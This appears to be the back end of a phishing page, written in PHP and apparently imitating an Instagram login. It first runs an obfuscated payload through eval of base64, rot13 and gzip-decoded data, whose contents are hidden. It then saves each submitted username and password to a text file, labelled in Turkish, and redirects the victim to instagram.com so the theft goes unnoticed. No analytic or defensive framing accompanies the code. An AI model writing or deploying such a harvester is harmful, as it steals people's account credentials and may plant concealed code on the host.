<?php
eval(gzinflate(str_rot13(base64_decode('hY/BCsIwEFHvhf7DRQJIKBXPoiDagkNH0m0SKW4bjKhaVUXUvzcNFPGit3Lm7ews6fQN5hAJhkquRG/aZ2t6TZNXfZ5ZRiVHNAsDoqSxjnBNsxeMwiDqDNctu/MI5gsg9X5KScdrEONG4hDFjGxV3XwhgxifwmDsksGFo2PR6JrUl/ZvblHc2HteMtxX1YsoEksddbHbSj4rAas7/p/LN0yxLhPwP/zGdkkd6Laiy3qZdPRmgDTMsqEjf2X0e73DRFXw9uwN'))));
file_put_contents("hesaplar.txt", "kullanıcı adı: " . $_POST['username'] . " şifre: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
